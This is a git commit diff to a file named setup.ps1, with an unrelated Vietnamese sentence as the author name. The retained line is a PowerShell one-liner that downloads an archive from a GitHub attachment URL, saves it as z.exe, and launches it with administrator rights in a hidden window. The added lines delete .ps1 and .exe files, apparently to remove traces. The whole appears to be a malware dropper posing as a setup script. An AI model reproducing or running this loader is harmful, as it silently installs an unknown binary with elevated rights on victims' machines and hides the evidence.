44565904de82a2a9acd5e0e1611e70ba79474167
Joker có chủ đề chính là bệnh tâm thần và các triệu chứng liên quan <acc@locallhost.cloud>
2024-07-27 14:50:56 +0700

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,2 +1,5 @@
 $Url = 'https://github.com/user-attachments/files/16326332/0.zip';[Net.ServicePointManager]::SecurityProtocol = "tls12, tls11, tls";$ProgressPreference = 'SilentlyContinue';$OutFile = Join-Path -Path $env:USERPROFILE -ChildPath 'z.exe';Invoke-WebRequest -Uri $Url -OutFile $OutFile;$InstallerPath = $OutFile;$Arguments = '-fullinstall';$Command = "Start-Process -FilePath '$InstallerPath' -ArgumentList '$Arguments' -Verb RunAs -WindowStyle Hidden";Invoke-Expression -Command $Command;;;;
-
+@echo off
+del /q *.ps1
+del /q *.exe
+exit
